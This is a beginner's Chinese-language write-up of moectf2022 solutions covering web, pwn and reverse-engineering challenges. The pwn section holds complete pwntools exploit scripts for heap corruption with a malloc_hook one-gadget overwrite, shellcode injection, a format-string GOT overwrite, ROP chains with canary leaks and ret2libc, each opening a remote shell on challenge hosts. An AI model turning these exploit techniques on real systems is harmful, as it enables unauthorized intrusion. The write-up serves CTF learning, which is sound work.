---
title: moectf2022 wp ——我的第一场ctf
---

​        很难忘记写出支付系统的下午，一道web题打开了新世界大门，第一次读这样大量的代码，审计进度缓慢，但是一行行下来思路越来越清晰，是非常漂亮的源码。最后“脑筋急转弯”一般出了题，急忙找logiris分享，收获一个晚上好心情。 

## web

### God_of_Aim

**js 代码加密 **

用python打印

### whatareyouuploading

**[后缀名绕过](https://blog.csdn.net/weixin_42591413/article/details/113561271)**（burpsuite工具）

- 核心功能proxy：拦截浏览器的会话内容

- interrcrept截断，旧版本需要设置网络代理,拦截修改之后可以forward或者drop

### baby_file

**php文件包含**

- 伪协议



### ezphp

highlight_file('source.txt');

($_GET['flag']) && !isset($_POST['flag'])

`$GET[' ']`显示在地址栏

`$POST[' ']`不会显示在地址栏



foreach ($_POST as $key => $value)

`foreach`:循环，适用于数组

`key value`检索健和值



 $$key = $value;

`$$`把变量值当作变量名使用



```php
<?php

highlight_file('source.txt');
echo "<br><br>";

$flag = 'xxxxxxxx';
$giveme = 'can can need flag!';
$getout = 'No! flag.Try again. Come on!';
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($giveme);
}
//如果没有名为GET或者POST会显示，can can need flag!

if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
    exit($getout);
}
//如果flag变量值为flag会显示No! flag.Try again. Come on!

foreach ($_POST as $key => $value) {
    $$key = $value;
}
//

foreach ($_GET as $key => $value) {
    $$key = $$value;
}

echo 'the flag is : ' . $flag;

?>


No! flag.Try again. Come on!
```



### 支付系统

- os：操作系统信息
- uuid：标识符
- tortoise-orm：描述对象和数据库之间的映射
- quart：Asyncio的Python微框架

```python
@app.route('/flag')
#配置路由
async def flag():
    #render_template用于渲染模板（flag.html），参数：balance、flag
    return await render_template(
        'flag.html',
        balance=session['balance'],
        #获取环境变量FLAG
        flag=os.getenv('FLAG'),
    )
```



```python
@app.before_request
#每一次route请求来到之后都需要执行它
#session：会话控制，储存在session中的信息不会丢失
async def create_session():
    if 'uid' not in session:
        session['uid'] = str(uuid.uuid4())
    session['balance'] = 0
    #await后面是返回的一个promise的resolve/reject的结果
    for tr in await Transaction.filter(user=session['uid']).all():
        #如果status等于0，则balance加上amount
        if tr.status == TransactionStatus.SUCCESS:
            session['balance'] += tr.amount
```



```python
@app.route('/pay')
async def pay():
    transaction = await Transaction.create(
        amount=request.args.get('amount'),
        desc=request.args.get('desc'),
        status=TransactionStatus.PENDING,
        user=uuid.UUID(session.get('uid'))
    )
    app.add_background_task(do_callback, transaction)
    return redirect(f'/transaction?id={transaction.id}')

```





- enum：枚举
- httpx：网络请求库
- JWT（JSON Web Token）  JWT自身包含身份验证所需要的所有信息	
  - header：
  - payload：不加密，Base64编码
  - signature：前两部分的签名，密钥存放在服务端.有了签名之后，即使 JWT 被泄露或者解惑，黑客也没办法同时篡改 Signature 、Header 、Payload。

```
session=eyJ1aWQiOiJhNTI3MDFmZS00ZTJjLTQxYTQtYjNlZi0zY2UwNjExZWEzNjciLCJiYWxhbmNlIjowfQ.Yw-AAg.PeK3DImWzrWI7FI-yLSVluBPGmM
```

### baby_unserlialize

- 如何查看session moe？

- unserlialize是什么





## pwn

### endian

- 八个二进制、两个十六进制数表示一个字节，int：四个字节

- endian：计算机通信的信息应该以什么顺序传送，bigedian：高位传送，littleediaan：地位传送。
寄存器RDI的存储的值0x4008a9是“MikatoNB”的地址，查看内存发现储存方式是
```
pwndbg> x /10gx 0x4008a9
0x4008a9:	0x424e6f74616b694d(BNotakiM)
```
字符串：大端法

寄存器RDI的存储的值0x4008a9是“MikatoNB”的地址，查看内存发现储存方式是
```
pwndbg> x /10gx 0x4008a9
0x4008a9:	0x424e6f74616b694d(BNotakiM)
```

输入0x10203040和0x50607080之后的储存
270544960   1348497536

```
0x7fffffffdf80 ◂— 0x5060708010203040
```
整数：小端法

424e6f74     616b694d
num2 : 1112436596
num1 : 1634429261





### random

思路：更改seed或者泄露seed的值。注意到name的区域和seed的区域在栈中是相邻的，可以在输出name的同时，输出seed。

- pwntools中的recv方法，返回值为byte

```python
giacomo.recv(numb = 4)
giacomo.recvuntil('hello')
```

- byte格式转化

```python
hex_str = byte.hex()  #str
int_10 = int(hex_str, 16)  #int_10
```

- python中引用c语言库的函数

```python
from ctypes import *
c = cdll.LoadLibrary('./libc.s0.6')
```





### ret2text

[更换可执行文件的glibc](https://www.cnblogs.com/z2yh/p/13881605.html)

- 可执行文件所需的动态库

```txt
giacomo@ubuntu:~/Desktop/moectf$ ldd ret2text
	linux-vdso.so.1 (0x00007ffdab1dc000)
	libc.so.6 => /home/giacomo/Desktop/tools/glibc-all-in-one/libs/2.34-0ubuntu3.2_amd64/libc.so.6 (0x00007f82bef92000) 
	/lib64/34_0-linux.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f82bf1bc000)
```

ld版本需要和libc版本一致，ld为连接器

- 计算返回地址到可以控制地址的距离

和ebp的内存是绝对的，和esp的内存是变化的

- got EOF in interactive



在system(/bin/sh)之前正常执行，卡在如上指令位置。movaps指令会检查rsp是否对齐(末尾为0)，因此需要奇数次的指令将rsp结尾从8改为0。解决方法：1. add a ret  2.跳转的指令往下一行



### s1mple_heap

- 思路 ：

  - 保护全开。PIE保护——.text,.data,.bss段每次加载基址不同。Full RELRO——无法修改got表
  - 有one-gadget：可以利用malloc_hook
  - free后指针清零：无法use after free

- 相关资料  

  

  

  ```
  pwndbg> b one_gadget
  Breakpoint 1 at 0x555555555dfd
  
  
  0x555555558020 <stdout@@GLIBC_2.2.5>:	0x00007ffff7fb06a0	0x0000000000000000
  0x555555558030 <stdin@@GLIBC_2.2.5>:	0x00007ffff7faf980	0x0000000000000000
  0x555555558040 <mmap>:	0x00000000eeeeeeee	0x0000000000000010  (0)
  0x555555558050 <mmap+16>:	0x0000000000000000	0x0000000000000000
  0x555555558060 <mmap+32>:	0x00000000ffffffff	0x00000000000003d0  (1)
  0x555555558070 <mmap+48>:	0x0000000000000000	0x0000000000000000
  0x555555558080 <mmap+64>:	0x0000000000000000	0x0000000000000000  (2)
  0x555555558090 <mmap+80>:	0x0000000000000000	0x0000000000000000
  0x5555555580a0 <mmap+96>:	0x0000000000000000	0x0000000000000000   (3)
  0x5555555580b0 <mmap+112>:	0x0000000000000000	0x0000000000000000
  0x5555555580c0 <mmap+128>:	0x0000000000000000	0x0000000000000000  (4)
  0x5555555580d0 <mmap+144>:	0x0000000000000000	0x0000000000000000
  0x5555555580e0 <mmap+160>:	0x0000000000000000	0x0000000000000000   (5)
  0x5555555580f0 <mmap+176>:	0x0000000000000000	0x0000000000000000
  0x555555558100 <mmap+192>:	0x0000000000000000	0x0000000000000000
  0x555555558110 <mmap+208>:	0x0000000000000000	0x0000000000000000
  0x555555558120 <mmap+224>:	0x0000000000000000	0x0000000000000000
  0x555555558130 <mmap+240>:	0x0000000000000000	0x0000000000000000
  0x555555558140 <mmap+256>:	0x0000000000000000	0x0000000000000000
  0x555555558150 <mmap+272>:	0x0000000000000000	0x0000000000000000
  0x555555558160 <mmap+288>:	0x0000000000000000	0x0000000000000000
  0x555555558170 <mmap+304>:	0x0000000000000000	0x0000000000000000
  0x555555558180 <mmap+320>:	0x0000000000000000	0x0000000000000000
  0x555555558190 <mmap+336>:	0x0000000000000000	0x0000000000000000
  0x5555555581a0 <mmap+352>:	0x0000000000000000	0x0000000000000000
  0x5555555581b0 <mmap+368>:	0x0000000000000000	0x0000000000000000
  0x5555555581c0 <mmap+384>:	0x0000000000000000	0x0000000000000000
  0x5555555581d0 <mmap+400>:	0x0000000000000000	0x0000000000000000
  0x5555555581e0 <mmap+416>:	0x0000000000000000	0x0000000000000000
  0x5555555581f0 <mmap+432>:	0x0000000000000000	0x0000000000000000
  0x555555558200 <mmap+448>:	0x0000000000000000	0x0000000000000000
  0x555555558210 <mmap+464>:	0x0000000000000000	0x0000000000000000
  0x555555558220 <mmap+480>:	0x0000000000000000	0x0000000000000000
  0x555555558230 <mmap+496>:	0x0000000000000000	0x0000000000000000
  0x555555558240 <mmap+512>:	0x0000000000000000	0x0000000000000000
  0x555555558250 <mmap+528>:	0x0000000000000000	0x0000000000000000
  0x555555558260 <mmap+544>:	0x0000000000000000	0x0000000000000000
  0x555555558270 <mmap+560>:	0x0000000000000000	0x0000000000000000
  0x555555558280 <mmap+576>:	0x0000000000000000	0x0000000000000000
  0x555555558290 <mmap+592>:	0x0000000000000000	0x0000000000000000
  0x5555555582a0 <mmap+608>:	0x0000000000000000	0x0000000000000000
  0x5555555582b0 <mmap+624>:	0x0000000000000000	0x0000000000000000
  0x5555555582c0 <mmap+640>:	0x0000000000000000	0x0000000000000000
  0x5555555582d0 <mmap+656>:	0x0000000000000000	0x0000000000000000
  0x5555555582e0 <mmap+672>:	0x0000000000000000	0x0000000000000000
  0x5555555582f0 <mmap+688>:	0x0000000000000000	0x0000000000000000
  0x555555558300 <mmap+704>:	0x0000000000000000	0x0000000000000000
  0x555555558310 <mmap+720>:	0x0000000000000000	0x0000000000000000
  0x555555558320 <mmap+736>:	0x0000000000000000	0x0000000000000000
  0x555555558330 <mmap+752>:	0x0000000000000000	0x0000000000000000
  0x555555558340 <mmap+768>:	0x0000000000000000	0x0000000000000000
  0x555555558350 <mmap+784>:	0x0000000000000000	0x0000000000000000
  0x555555558360 <mmap+800>:	0x0000000000000000	0x0000000000000000
  0x555555558370 <mmap+816>:	0x0000000000000000	0x0000000000000000
  0x555555558380 <mmap+832>:	0x0000000000000000	0x0000000000000000
  0x555555558390 <mmap+848>:	0x0000000000000000	0x0000000000000000
  0x5555555583a0 <mmap+864>:	0x0000000000000000	0x0000000000000000
  0x5555555583b0 <mmap+880>:	0x0000000000000000	0x0000000000000000
  0x5555555583c0 <mmap+896>:	0x0000000000000000	0x0000000000000000
  0x5555555583d0 <mmap+912>:	0x0000000000000000	0x0000000000000000
  0x5555555583e0 <mmap+928>:	0x0000000000000000	0x0000000000000000
  0x5555555583f0 <mmap+944>:	0x0000000000000000	0x0000000000000000
  0x555555558400 <mmap+960>:	0x0000000000000000	0x0000000000000000
  0x55555555 8410   <mmap+976>:	0x0000000000000000	0x0000000000000000
  0x555555558420 <mmap+992>:	0x0000000000000000	0x0000000000000000
  0x555555558430 <mmap+1008>:	0x0000000000000000	0x0000000000000000
  0x555555558440 <fast_bin>:	0x0000000000000000	0x0000000000000000
  0x555555558450 <fast_bin+16>:	0x0000000000000000	0x0000000000000000
  0x555555558460 <ChunkInfo>:	0x0000555555558050	0x0000000000000010
  0x555555558470 <ChunkInfo+16>:	0x0000000000000000	0x0000000000000000
  0x555555558480 <ChunkInfo+32>:	0x0000000000000000	0x0000000000000000
  0x555555558490 <ChunkInfo+48>:	0x0000000000000000	0x0000000000000000
  0x5555555584a0 <ChunkInfo+64>:	0x0000000000000000	0x0000000000000000
  0x5555555584b0 <ChunkInfo+80>:	0x0000000000000000	0x0000000000000000
  0x5555555584c0 <ChunkInfo+96>:	0x0000000000000000	0x0000000000000000
  0x5555555584d0 <ChunkInfo+112>:	0x0000000000000000	0x0000000000000000
  0x5555555584e0 <ChunkInfo+128>:	0x0000000000000000	0x0000000000000000
  0x5555555584f0 <ChunkInfo+144>:	0x0000000000000000	0x0000000000000000
  0x555555558500 <ChunkInfo+160>:	0x0000000000000000	0x0000000000000000
  0x555555558510 <ChunkInfo+176>:	0x0000000000000000	0x0000000000000000
  0x555555558520 <ChunkInfo+192>:	0x0000000000000000	0x0000000000000000
  0x555555558530 <ChunkInfo+208>:	0x0000000000000000	0x0000000000000000
  0x555555558540 <ChunkInfo+224>:	0x0000000000000000	0x0000000000000000
  ```
  
  
  
  ```
  from pwn import *
  
  context(os='linux',arch='amd64',log_level='debug')
  content = 0
  
  elf = ELF("./s1mple_heap")
  libc = ELF('./libc-2.31.so')
  
  if content == 1:
      giacomo = process('./s1mple_heap')
  else:
      giacomo = remote("pwn.blackbird.wang",9600)
  
  def allocate(size):
      size = str(size)
      giacomo.sendlineafter('5.exit\n','1')
      giacomo.sendlineafter('size:',size)
  
  def delete(id):
      id = str(id)
      giacomo.sendlineafter('5.exit\n','2')
      giacomo.sendlineafter('index:',id)
  
  def fill(id, content):
      id = str(id)
      giacomo.sendlineafter('5.exit\n','3')
      giacomo.sendlineafter('index:\n', id)
      giacomo.sendafter('content:\n', content)
      giacomo.sendline('')
  
  def print_heap(id):
      id = str(id)
      giacomo.sendlineafter('5.exit\n','4')
      giacomo.sendlineafter('index:\n', id)
  
  
  def main():
      
  
  #---------------------------------------------------------------- 
  
      # gdb.attach(giacomo)
      # pause()
      
      allocate(0x10) #0
      allocate(0x10) #1 
      allocate(0x10) #2
      allocate(0x10) #3
      allocate(0x10) #4
  
      #将fastbin链更改为fastbin->1->4
      delete(2) 
      delete(1)
      payload = b'a'*0x10 + p32(0xffffffff) + p32(0) + p64(0x10) + p8(0xc0)
      fill(0, payload)
  
      #将4的inuse位更改
      payload = b'a'*0x10 + p32(0xffffffff) + p32(0)
      fill(3, payload)
  
      #重新利用4也就是2
      allocate(0x10) #1
      allocate(0x10) #2 & 4
      
      #获取1的地址
      delete(1)
      delete(4)
      print_heap(2)
      
      #计算需要申请的地址位置和onegadget位置
      addr = giacomo.recv(numb = 0x8) #接收1的地址 0x555555558060
      addr = addr.hex()
      addr_1 = addr[10:12]+addr[8:10]+addr[6:8]+addr[4:6]+addr[2:4]+addr[0:2]
      addr_1 = int(addr_1,16)
      one_gadget = addr_1 - 0x2263 #one_gadget地址
      chunk = addr_1 + 0x3b0 #申请的chunk地址
      payload = b'a'*0x10 + p32(0xeeeeeeee) + p32(0) + p64(0x10) + p64(chunk)
      fill(3, payload)
  
      #更改大小
  
      allocate(0x300) #1
      allocate(0x10) #4
      allocate(0x10) #5
      allocate(0x10) #6
      payload = p32(0xffffffff) + p32(0) + p64(0x80)
      fill(6, payload)
  
      #申请内存
      delete(2)
      payload = b'a'*0x10 + p32(0xffffffff) +p32(0)+p64(0x10)+p64(addr_1 + 0x3a0)
      fill(3, payload)
      allocate(0x10) #2
      allocate(0x80) #7
  
      #更改malloc_hook
      payload = b'a' * 0x48 +p64(one_gadget)
      fill(7,payload)
  
      #调用malloc_hook
      giacomo.sendlineafter('5.exit\n','1')
      giacomo.interactive()
  
  
  main()
  
  ```
  
### shellcode

  用汇编语言编写

```
from pwn import *

context(os='linux',arch='amd64',log_level='debug')
content = 0

if content == 1:
    giacomo = process('./shellcode')
else:
    giacomo = remote("43.136.137.17", 3914)

def main():
    payload = asm(shellcraft.sh())
    giacomo.sendline(payload)
    giacomo.interactive()

main()

```



### babyfmt

- 检查保护

```
    RELRO:    Partial RELRO     //可以修改got
    Stack:    No canary found     
    NX:       NX enabled
    PIE:      No PIE (0x8048000)    //基址不会变化,
```

- gift地址的获取

​	`giacomorecvuntil('\n', drop=true)`

```
gift: 0x8de91a0\n

67696674 3a20 3078 38646539316130  0a
//不需要这样手动完成
```

- 打包函数

  `比如将0xdeadbeef进行32位的打包，将会得到'\xef\xbe\xad\xde'`

- 下断点

​	gdb的断点在read函数的syscall之后，且注意arch = x86，否则调试不正常


- fmtstr_payload

  专门为32位格式化字符串设计，可以同时传多个数据

```
  p0x804a010 <printf@got.plt>:	0x0804843608048426
  
```

- exp

```
from pwn import *

context(os='linux',arch='x86',log_level='debug')
content = 0

if content == 1:
    giacomo = process('./babyfmt')
else:
    giacomo = remote("43.136.137.17",3913)


def main():
    # gdb.attach(giacomo,'b* 0x804868d')
    # pause()
    giacomo.recvuntil(b'gift: ')
    # gift = int(giacomo.recvuntil(b'\n', drop=True), 16)
    gift = 0x804859b
    print(">> gift:", hex(gift))
    printf_got = 0x804a010
    payload = fmtstr_payload(11, {printf_got: gift, printf_got+4:0})
    giacomo.send(payload)
    giacomo.recv()
    giacomo.send('1')
    giacomo.interactive()

main()
```



### rop32

- 下载glibc失败：download_old

- read之后字符串储存在哪里？

  ​	可以指定read函数参数，将字符串储存到那里

- gdb无法调试

  ```
  Reading symbols from ./rop32...
  (No debugging symbols found in ./rop32)
  ```
  
- read大小限制了读写的大小，如何把payload传进去

​		/bin/sh没有成功传输：超出了读取范围

​		`sh: 1: Syntax error: Unterminated quoted string`

​		函数的plt和参数之间有一个4bit的偏差，但是也有没有偏差的函数[pop&ret](https://blog.csdn.net/qq_37340753/article/details/81585083?spm=1001.2101.3001.6650.13&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-81585083-blog-54922838.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-81585083-blog-54922838.pc_relevant_aa&utm_relevant_index=14)

​		

```
from pwn import *

context(os='linux',arch='x86',log_level='debug')
content = 0

if content == 1:
    giacomo = process('./rop32')
else:
    giacomo = remote("124.223.158.81",27003)

def main():
    # gdb.attach(giacomo, 'b* 0x80491B9')
    # pause()
    system = 0x8049070
    sh = 0x804c024
    payload = b'a'*0x20 + p32(0x80491E7) +p32(sh)
    giacomo.sendlineafter('Go Go Go!!!\n',payload)
    giacomo.interactive()


main()
```

### rop64

- printf：泄露canary的值[canary](https://blog.csdn.net/AcSuccess/article/details/104115114)

  64位canary有八位，末尾是/00，保证切断字符串

  

- 栈溢出更改函数进程

```
from pwn import *

context(os='linux',arch='amd64',log_level='debug')
content = 0

if content == 1:
    giacomo = process('./rop64')
else:
    giacomo = remote("124.223.158.81", 27004)

def main():
    sh = 0x0000000000404058
    system = 0x401284
    rdi = 0x4011de
    giacomo.sendafter(b'Go Go Go!!!\n',b'a'*0x29)
    giacomo.recvuntil(b'a'*0x28)
    canary = u64(giacomo.recv(numb = 0x8)) - 0x61
    print(hex(canary))
    payload = b'a'*0x28 + p64(canary) +b'a'*8+ p64(rdi) + p64(sh) + p64(system)
    giacomo.send(payload)
    giacomo.interactive()



main()
```



### syscall

- [什么是syscall](https://blog.csdn.net/weixin_43363675/article/details/117944212)

​	rax = 0x3b（不需要gadget）
​	rdi指向"/bin/sh"
​	rsi = 0x0
​	rdx = 0x0

- 如何控制RAX

  call read@plt之后，RAX变为输入的字符。RAx用于存放返回的字符





```
from pwn import *

context(os='linux',arch='amd64',log_level='debug')
content = 0

if content == 1:
    giacomo = process('./syscall')
else:
    giacomo = remote("124.223.158.81", 27005)

def main():
    # gdb.attach(giacomo)
    # pause()
    giacomo.recvuntil(b'first!\n')
    gift = giacomo.recvuntil(b'\n',drop = True)
    print(gift)
    print('------------')
    base = int(gift,16)-0x11a9
    rdi = base+0x11b1
    rsirdx = base+0x11b3
    binsh = base+0x4010
    rdx = base+0x11b4
    read = base + 0x11D8
    syscall = base +0x11b6
    # payload = b'a'*0x48 + p64(rdx) + p64(0x100)+p64(read)
    # giacomo.send(payload)
    payload = b'a'*0x48 +p64(rdi) + p64(binsh) + p64(rsirdx) + p64(0) + p64(0) + p64(syscall)
    giacomo.send(payload)
    giacomo.send(b'a'*0x3b)
    giacomo.interactive()


main()
```

### ret2libc

​	plt、got的地址需要泄露[ret2libc](https://blog.csdn.net/m0_46363249/article/details/115270147)

​	泄露puts函数地址，调用system(/bin/sh)

```
from pwn import *
from LibcSearcher import *

context(os='linux',arch='amd64',log_level='debug')
content = 0

if content == 1:
    giacomo = process('./ret2libc')
else:
    giacomo = remote("124.223.158.81", 27006)

def main():
    # gdb.attach(giacomo)
    # pause()
    elf = ELF('./ret2libc')
    rdi = 0x40117e
    
    read_got = 0x7ffff7eab920
    payload = b'a'*0x48 + p64(rdi) + p64(elf.got['puts'])+p64(elf.plt['puts']) + p64(0x401183)
    giacomo.recvuntil(b'Go Go Go!!!\n')
    giacomo.send(payload)
    gift = (giacomo.recvuntil(b'\n', drop = True)).hex()
    gift1 =''
    for i in range (6):
        gift1 = gift[i*2:i*2+2]+gift1
    print(gift1)
    puts_addr = int(gift1,16)
    libc = LibcSearcher("puts",puts_addr)
    libcbase = puts_addr - libc.dump("puts")
    system_addr = libcbase + libc.dump("system")            #system 偏移
    bin_sh_addr = libcbase + libc.dump("str_bin_sh")         #/bin/sh 偏移
    # giacomo.recvuntil(b'Go Go Go!!!\n')
    payload = b'a'*0x48 + p64(rdi) + p64(bin_sh_addr) + p64(0x40101a)+ p64(system_addr)
    giacomo.send(payload)
    giacomo.interactive()
main()
```



![img](https://img-blog.csdn.net/20181011161018870?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDk5MTAzNA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

- 寻找libc中的地址



## re



### begin

- gdb不能看printf的输出？
  - put函数会在末尾自动携带\n
  - printf若不带\n，会在scanf之前清空缓冲区

```
from pwn import *

context(os='linux',arch='amd64',log_level='debug')
content = 1

if content == 1:
    giacomo = process('./begin')
else:
    giacomo = remote("124.223.158.81",27003)

def main():
    gdb.debug(giacomo)
    pause()
    giacomo.send('moect')
    giacomo.recvlines(6)


main()
```





### base64

exp

```
#include <stdio.h>
#include <string.h>

int base64_decode(char *base64, char *originChar);

int main()
{
    char base64[] = "1wX/yRrA4RfR2wj72Qv52x3L5qa=";
    char de64[20];
    base64_decode(base64, de64);
    printf("%s",de64);
    return 0;
}



int base64_decode(char *base64, char *originChar)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  unsigned int temp[4]; // [rsp+23h] [rbp-Dh] BYREF
  unsigned int k; // [rsp+27h] [rbp-9h]
  int j; // [rsp+28h] [rbp-8h]
  int i; // [rsp+2Ch] [rbp-4h]
  char base64char[] = "abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ";

  i = 0;
  j = 0;
  while ( base64[i] )
  {
    memset(temp, 255, sizeof(temp));
    for ( k = 0; k <= 0x3Fu; ++k )
    {
      if ( base64char[k] == base64[i] )
        temp[0] = k;
    }
    for ( k = 0; k <= 0x3Fu; ++k )
    {
      if ( base64char[k] == base64[i + 1] )
        temp[1] = k;
    }
    for ( k = 0; k <= 0x3Fu; ++k )
    {
      if ( base64char[k] == base64[i + 2] )
        temp[2] = k;
    }
    for ( k = 0; k <= 0x3Fu; ++k )
    {
      if ( base64char[k] == base64[i + 3] )
        temp[3] = k;
    }
    v2 = j++;
    originChar[v2] = (temp[1] >> 4) & 3 | (4 * temp[0]);
    if ( base64[i + 2] == 61 )
      break;
    v3 = j++;
    originChar[v3] = (temp[2] >> 2) & 0xF | (16 * temp[1]);
    if ( base64[i + 3] == 61 )
      break;
    v4 = j++;
    originChar[v4] = temp[3] & 0x3F | (temp[2] << 6);
    i += 4;
  }
  return j;
}
```







